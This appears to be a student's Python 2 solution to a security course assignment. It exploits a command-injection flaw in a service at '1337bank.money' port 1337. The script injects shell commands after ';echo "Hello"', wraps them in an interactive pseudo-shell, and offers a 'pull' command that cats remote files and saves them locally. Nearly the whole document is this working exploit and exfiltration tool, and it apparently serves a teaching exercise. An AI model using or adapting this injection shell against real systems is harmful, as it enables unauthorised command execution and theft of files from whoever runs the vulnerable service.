"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket

host = "1337bank.money" # IP address here
port = 1337 # Port here

def execute_cmd():

    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command
    """
    #print("IMPLEMENT ME")
    path = ""
    cmd = raw_input("shell> ")

    while "exit" not in cmd:
        if cmd == "quit":
            sys.exit(0)

        cmds = ';echo "Hello"'

        if "cd" in cmd:
            path += ";" + cmd
            cmd = raw_input("shell> ")
            continue
        else:
            if path == "":
                cmds += ";" + cmd
            else:
                cmds += path + ";" + cmd

        cmds += "\n"
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        data = s.recv(4096)
        s.send(cmds)
        data = s.recv(4096)
        data2 = s.recv(4096)
        #print(cmds)
        index = data2.index("Hello")+5
        data2 = data2[index:]
        print(data2)
        cmd = raw_input("shell> ")


def execute_pull(i):
    #print("Pulling 2")
    x = i.split(" ")

    cmds = ';echo "Hello";'
    cmds += "cat " + x[1] + "\n"

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    data = s.recv(4096)
    s.send(cmds)
    data = s.recv(4096)
    data2 = s.recv(4096)
    #print(cmds)
    index = data2.index("Hello")+5
    data2 = data2[index:]
    #print(data2)
    f = open(x[2], "w+")
    f.write(data2)
    f.close()

if __name__ == '__main__':
    #print("IMPLEMENT ME")
    i = raw_input("> ")

    while "quit" not in i:
        if i == 'help':
            print("1. shell - Drop into interactive shell and allow users to gracefully exit")
            print("2. pull <remote-path> <local-path> - Download files")
            print("3. help - Shows this help menu")
            print("4. quit - Quit the shell")
            i = raw_input("> ")
        elif "pull" in i:
            #print("pulling")
            execute_pull(i)
            i = raw_input("> ")
        else:
            execute_cmd()
            i = raw_input("> ")
